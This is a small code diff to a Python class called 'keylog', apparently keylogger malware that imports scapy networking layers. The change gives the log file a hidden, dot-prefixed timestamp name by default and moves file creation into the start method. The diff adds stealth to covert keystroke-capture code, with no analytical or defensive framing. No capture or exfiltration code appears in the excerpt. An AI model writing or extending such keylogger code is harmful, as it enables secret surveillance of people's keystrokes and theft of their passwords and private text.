@@ -6,15 +6,14 @@ from scapy.layers.inet import IP, UDP
 
 
 class keylog:
-    def __init__(self, time, file):
+    def __init__(self, t, file="."+str(datetime.now())[:-7].replace(" ", "-").replace(":", "") + ".txt"):
         self.file = file
-
-        open(file, "w+")
-        self.time = time
+        self.time = t
         self.log = ""
         self.on = False
 
     def start(self):
+        open(self.file, "w+")
         if not self.on:
             self.on = True
             self.__report()
